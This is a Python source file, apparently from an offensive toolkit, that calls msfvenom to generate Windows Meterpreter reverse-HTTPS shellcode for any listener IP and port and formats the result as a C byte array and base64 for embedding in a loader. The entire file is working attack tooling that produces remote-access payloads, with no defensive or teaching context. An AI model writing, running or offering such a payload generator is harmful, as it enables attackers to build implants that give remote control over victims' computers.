"""Msfvenom Adapter - Generate shellcode with any IP"""
import subprocess
import base64
from pathlib import Path

def generate_shellcode(listener_ip, listener_port=4444, arch="x64", payload_type="windows/x64/meterpreter/reverse_https"):
    """
    Generate msfvenom shellcode with dynamic IP

    Args:
        listener_ip: ANY IP address
        listener_port: Port (default 4444)
        arch: x64 or x86
        payload_type: MSF payload type

    Returns:
        dict with shellcode_path, shellcode_bytes, c_array
    """

    # Check if msfvenom exists
    try:
        subprocess.run(["which", "msfvenom"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        return {
            "success": False,
            "error": "Msfvenom not installed",
            "install_cmd": "apt install metasploit-framework"
        }

    # Create output directory
    output_dir = Path("output/shellcode")
    output_dir.mkdir(parents=True, exist_ok=True)

    # Output file
    output_file = output_dir / f"msfvenom_{listener_ip.replace('.', '_')}_{listener_port}.bin"

    # Determine payload based on arch
    if arch == "x86" and "x64" in payload_type:
        payload_type = payload_type.replace("x64", "")

    try:
        # Generate shellcode
        cmd = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={listener_ip}",
            f"LPORT={listener_port}",
            "-f", "raw",
            "-o", str(output_file)
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode != 0:
            return {
                "success": False,
                "error": f"Msfvenom failed: {result.stderr}"
            }

        # Read shellcode
        with open(output_file, 'rb') as f:
            shellcode_bytes = f.read()

        # Convert to C array
        c_array = "unsigned char shellcode[] = {\n"
        for i in range(0, len(shellcode_bytes), 12):
            chunk = shellcode_bytes[i:i+12]
            hex_bytes = ', '.join(f'0x{b:02x}' for b in chunk)
            if i + 12 < len(shellcode_bytes):
                c_array += f"    {hex_bytes},\n"
            else:
                c_array += f"    {hex_bytes}\n"
        c_array += "};\nunsigned int shellcode_len = " + str(len(shellcode_bytes)) + ";"

        return {
            "success": True,
            "shellcode_path": str(output_file),
            "shellcode_bytes": base64.b64encode(shellcode_bytes).decode('utf-8'),
            "shellcode_size": len(shellcode_bytes),
            "c_array": c_array,
            "listener": f"{listener_ip}:{listener_port}",
            "payload_type": payload_type,
            "architecture": arch
        }

    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Msfvenom timed out (30s)"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Unexpected error: {str(e)}"
        }
